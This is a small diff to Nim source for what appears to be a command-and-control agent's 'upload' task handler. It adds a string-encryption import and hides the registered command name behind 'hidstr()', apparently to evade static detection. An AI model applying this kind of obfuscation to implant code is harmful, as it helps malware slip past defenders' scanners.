@@ -1,6 +1,7 @@
 import std/[os, json, base64, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc uploadExecute(taskId: string, params: JsonNode, state: AgentState,
                    send: SendMsg): TaskResult =
@@ -67,4 +68,4 @@ proc uploadExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initUpload*() =
-  register("upload", uploadExecute)
+  register(hidstr("upload"), uploadExecute)
